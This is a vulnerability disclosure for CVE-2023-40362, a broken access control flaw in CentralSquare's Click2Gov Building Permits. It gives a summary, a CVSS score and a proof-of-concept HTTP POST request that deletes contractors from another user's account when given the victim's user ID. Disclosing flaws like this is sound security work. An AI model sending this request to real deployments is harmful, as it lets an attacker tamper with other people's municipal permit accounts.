# CVE-2023-40362
[CVE-2023-40362](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-40362) vulnerabilitiy details and proof-of-concept.

# Overview
An access control vulnerability in Click2Gov BP at the URI `/Click2GovBP/mastercontractorlist.html` leads to the ability for authenticated users to delete the 
contractors from the accounts of other users with the victim's user ID and the information of the contractor to delete.

This is caused by a failure of the web application to verify that the user is authorized to delete the contractor from the account of which the user ID is 
specified.

**Vendor**: [CentralSquare](https://www.centralsquare.com/)

**Reported By**: Ally Petitt

**Discovered**: June 13, 2023

**Affected Products**: Click2Gov Building Permits (BP)

**Affected Releases**: Before October 2023

**CVSS v3**: 5.4 - Moderate (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:L)



# Proof of Concept (PoC)
The HTTP POST request shown below can be made in order to delete a contractor from a victim's account. The CSRF token must be valid for this to work.

```
POST /Click2GovBP/mastercontractorlist.html HTTP/1.1
Host: <HOST>
Cookie: welcome=true; JSESSIONID=<SESSION_ID>;
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: <USER_AGENT>
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

contractorList%5B0%5D.number=<CONTRACTOR_NUMBER>&contractorList%5B0%5D.type=<CONTRACTOR_TYPE>&contractorList%5B0%5D.name=<CONTRACTOR_NAME>&submitRemoveContractor=true&confirmRemoveContractor=true&userId=<USER_ID>&OWASP_CSRFTOKEN=<CSRF_TOKEN>
```
